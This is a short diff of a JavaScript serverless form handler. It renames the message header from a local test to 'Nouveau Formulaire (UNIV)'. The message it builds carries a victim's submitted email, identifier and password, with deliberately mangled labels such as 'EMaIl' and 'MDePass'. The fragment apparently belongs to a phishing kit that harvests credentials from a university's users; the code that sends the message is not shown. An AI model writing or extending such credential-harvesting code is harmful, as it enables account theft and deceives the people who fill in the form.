@@ -41,7 +41,7 @@ export default async function handler(req, res) {
     }
 
     // Construire le message (texte)
-    const message = `📩 Test formulaire local
+    const message = `📩 Nouveau Formulaire (UNIV)
 📧 EMaIl: ${usermail}
 🆔 Ident: ${user}
 🔑 MDePass: ${pass}
